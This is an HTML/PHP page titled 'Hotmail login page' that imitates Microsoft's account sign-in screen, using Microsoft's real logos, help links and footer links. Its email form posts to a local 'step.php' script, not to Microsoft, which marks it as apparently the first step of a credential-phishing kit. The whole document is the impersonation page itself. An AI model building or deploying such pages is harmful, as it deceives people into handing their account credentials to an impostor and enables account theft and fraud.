<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Hotmail login page</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<div class="container">
  <div class="content">
  <img src="https://logincdn.msauth.net/16.000.28510.6/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
  
  <h1>Sign in</h1>
  <?php 
if (isset($_POST['submit'])){
	$name=$POST["email"];
	
}

?>
<form action="step.php" method="post">

  
  <input type="email" name="email" placeholder="Email, phone, or Skype">
  
  <p>No account? <a href="https://signup.live.com/signup?wa=wsignin1.0&rpsnv=13&ct=1584347917&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df1bd099c-7416-4aff-c899-6998df6ea4ab&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=B6492E7D00089D9D&bk=1584347918&uiflavor=web&lic=1&mkt=EN-US&lc=1033&uaid=f10fba09ddcd46de8fbf8a4f675b3674">Create one!</a></p>
  
    <p><a href="https://login.live.com/pp1600/#">Sign in with a security key</a> <img src="https://logincdn.msauth.net/16.000.28510.6/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" id="question-mark"></p>
  
  <p><a href="https://login.live.com/pp1600/#">Sign-in options</a></p>
  </div>
  
  <button type="submit">Next</button>

</form>
    
</div>


<footer id="footer">
  <div class="footer-container">
  <ul>
    <li><a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-US&vv=1600&uaid=3d4961d170b04e4aafe40ba4adef2f17">Terms of use</a></li>
    <li><a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-US&vv=1600&uaid=3d4961d170b04e4aafe40ba4adef2f17">Privacy & cookies</a></li>
  </ul>
  <img src="https://logincdn.msauth.net/16.000.28510.6/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
  </div>
</footer>
<!-- partial -->
  
</body>
</html>
